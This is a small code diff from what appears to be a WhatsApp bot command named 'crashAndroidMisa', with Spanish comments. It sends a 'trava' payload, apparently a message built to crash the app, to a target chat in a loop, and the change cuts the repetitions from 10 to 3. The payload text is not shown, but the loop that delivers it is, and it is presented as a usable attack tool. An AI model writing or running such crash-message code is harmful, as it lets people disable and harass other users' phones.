@@ -34,7 +34,7 @@ const crashAndroidMisa = {
             await conn.sendMessage(chat, { react: { text: '🚀', key: m.key } });
 
             // 2. Bucle de envío (10 veces)
-            for (let i = 1; i <= 10; i++) {
+            for (let i = 1; i <= 3; i++) {
                 try {
                     // Enviamos la carga
                     await conn.sendMessage(targetJid, { text: contenidoTrava });
